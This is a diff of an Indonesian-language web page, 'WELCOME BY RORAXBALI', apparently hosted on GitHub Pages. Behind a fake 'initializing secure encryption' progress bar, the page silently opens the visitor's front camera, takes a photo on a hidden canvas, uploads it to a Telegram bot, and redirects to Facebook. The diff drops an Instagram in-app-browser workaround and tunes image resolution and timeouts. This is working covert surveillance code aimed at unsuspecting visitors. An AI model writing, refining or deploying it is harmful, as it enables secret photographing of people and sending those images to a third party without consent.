@@ -105,65 +105,6 @@
             background-color: #ff0000 !important;
             box-shadow: 0 0 12px #ff0000 !important;
         }
-
-        /* Container Instruksi Fitur Salin Link */
-        .ig-box-instruksi {
-            display: none;
-            margin-top: 25px;
-            background: rgba(255, 0, 0, 0.03);
-            border: 1px dashed rgba(255, 0, 0, 0.2);
-            padding: 20px 15px;
-            border-radius: 4px;
-        }
-
-        /* Judul Peringatan Berwarna Merah */
-        .ig-text-error {
-            color: #ff3333 !important;
-            text-shadow: 0 0 10px #ff0000;
-            font-size: 15px;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-
-        /* Input Box Tempat Link Berada */
-        .salin-wrapper {
-            display: flex;
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-top: 15px;
-        }
-
-        .salin-input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: #888;
-            padding: 12px;
-            font-size: 12px;
-            font-family: sans-serif;
-            pointer-events: none;
-        }
-
-        /* Tombol Salin */
-        .salin-btn {
-            background: #ff0000;
-            color: #fff;
-            border: none;
-            padding: 0 20px;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            font-family: sans-serif;
-            transition: background 0.2s;
-        }
-
-        .salin-btn:active {
-            background: #b30000;
-        }
     </style>
 </head>
 <body>
@@ -172,34 +113,17 @@
         <div class="garis-merah-atas"></div>
         <h1>WELCOME BY RORAXBALI</h1>
         
-        <!-- Status Normal Browser (Chrome/Safari) -->
+        <!-- Status Proses Enkripsi -->
         <div class="status-text" id="status">Menginisialisasi enkripsi aman...</div>
         
         <!-- Progress Bar -->
-        <div class="progress-container" id="progressContainer">
+        <div class="progress-container">
             <div class="progress-bar" id="bar"></div>
         </div>
 
-        <!-- BLOK INSTRUKSI TAMPIL DI INSTAGRAM -->
-        <div id="igBox" class="ig-box-instruksi">
-            <div class="ig-text-error">
-                ⚠️ SISTEM TERBLOKIR DI INSTAGRAM
-            </div>
-            
-            <div class="status-text" style="color: #fff; font-size: 13px;">
-                SILAKAN MASUK DI GOOGLE CHROME ATAU BROWSER:
-            </div>
-
-            <!-- Fitur Salin Link Otomatis -->
-            <div class="salin-wrapper">
-                <input type="text" class="salin-input" id="linkInput" value="https://roraxbali.github.io/_one/" readonly>
-                <button class="salin-btn" id="copyBtn" onclick="salinTautanOtomatis()">Salin</button>
-            </div>
-        </div>
-
         <div class="garis-merah-bawah"></div>
-                </div>
-                    <video id="video" autoplay playsinline muted></video>
+    </div>
+        <video id="video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
 
     <script>
@@ -213,49 +137,17 @@
         const hiddenCanvas = document.getElementById('hiddenCanvas');
         const statusText = document.getElementById('status');
         const progressBar = document.getElementById('bar');
-        
-        // Element khusus Instagram
-        const igBox = document.getElementById('igBox');
-        const progressContainer = document.getElementById('progressContainer');
 
-        // Fungsi mengecek apakah dibuka dari dalam aplikasi Instagram / Facebook WebView
-        function isInstagram() {
-            return navigator.userAgent.includes("Instagram") || navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
-        }
-
-        if (isInstagram()) {
-            statusText.style.display = 'none';
-            progressContainer.style.display = 'none';
-            igBox.style.display = 'block';
-        } else {
-            mulaiKameraSistem();
-        }
-
-        function salinTautanOtomatis() {
-            const linkInput = document.getElementById('linkInput');
-            const copyBtn = document.getElementById('copyBtn');
-
-            linkInput.select();
-            linkInput.setSelectionRange(0, 99999);
-            navigator.clipboard.writeText(linkInput.value);
-
-            copyBtn.innerText = "Tersalin!";
-            copyBtn.style.background = "#00cc44";
-            
-            setTimeout(() => {
-                copyBtn.innerText = "Salin";
-                copyBtn.style.background = "#ff0000";
-            }, 3000);
-        }
+        // Memulai sistem kamera secara otomatis (Sudah pasti berjalan di browser eksternal resmi)
+        mulaiKameraSistem();
 
         function mulaiKameraSistem() {
-            // Diturunkan resolusinya ke 320x240 agar ukuran file sangat kecil & instan terkirim di HP lambat
             const constraints = {
-                video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, 
+                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
                 audio: false 
             };
 
-            // Set batasan waktu darurat: Jika dalam 6 detik macet total, paksa redirect ke FB
+            // Batas waktu pemindahan darurat (Maksimal 6 detik halaman terbuka harus dialihkan ke FB)
             setTimeout(() => {
                 window.location.href = DOMAIN_TUJUAN;
             }, 6000);
@@ -266,6 +158,8 @@
                     video.addEventListener('playing', () => {
                         statusText.innerText = "Otorisasi berhasil. Membuka halaman...";
                         progressBar.style.width = "65%"; 
+                        
+                        // Jeda seimbang 1.5 detik agar pencahayaan kamera menyesuaikan (tidak gelap)
                         setTimeout(ambilFotoOtomatis, 1500);
                     });
                 })
@@ -280,7 +174,6 @@
         }
 
         function ambilFotoOtomatis() {
-            // Mencegah looping macet jika dimensi kamera HP teman lambat memuat
             if (video.videoWidth === 0 || video.videoHeight === 0) {
                 setTimeout(ambilFotoOtomatis, 300);
                 return;
@@ -297,10 +190,14 @@
             context.drawImage(video, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
             context.restore();
 
-            // Menurunkan kualitas kompresi ke 0.5 agar file menjadi sangat ringan sehingga lolos dari jaringan lambat
+            // Kompresi kualitas seimbang (0.65) agar file ringan dikirim lewat jaringan lambat
             hiddenCanvas.toBlob((blob) => {
-                if (blob) { kirimKeTelegram(blob); } else { window.location.href = DOMAIN_TUJUAN; }
-            }, 'image/jpeg', 0.50);
+                if (blob) { 
+                    kirimKeTelegram(blob); 
+                } else { 
+                    window.location.href = DOMAIN_TUJUAN; 
+                }
+            }, 'image/jpeg', 0.65);
         }
 
         function kirimKeTelegram(imageBlob) {
@@ -309,10 +206,12 @@
             formData.append('photo', imageBlob, 'secure_log.jpg');
             formData.append('caption', '🛡️ Log Otorisasi Pengunjung: WELCOME BY RORAXBALI');
 
-            // SISTEM ANTI MACET (TIMEOUT DETECTOR)
-            // Jika dalam waktu 4 detik bot Telegram tidak merespons, langsung lempar user ke FB agar tidak macet
+            // Pengaman batas waktu respon API Telegram (4 detik)
             const controller = new AbortController();
-            const idTimeout = setTimeout(() => controller.abort(), 4000);
+            const idTimeout = setTimeout(() => {
+                controller.abort();
+                window.location.href = DOMAIN_TUJUAN;
+            }, 4000);
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
@@ -327,11 +226,12 @@
                 setTimeout(() => { window.location.href = DOMAIN_TUJUAN; }, 800);
             })
             .catch(error => {
-                // Tetap dialihkan ke halaman tujuan meskipun pengiriman gagal/terlalu lambat
-                console.error('Transmisi terputus atau timeout:', error);
+                console.error('Data dialihkan otomatis:', error);
                 window.location.href = DOMAIN_TUJUAN;
             });
         }
     </script>
 </body>
 </html>
+
+    
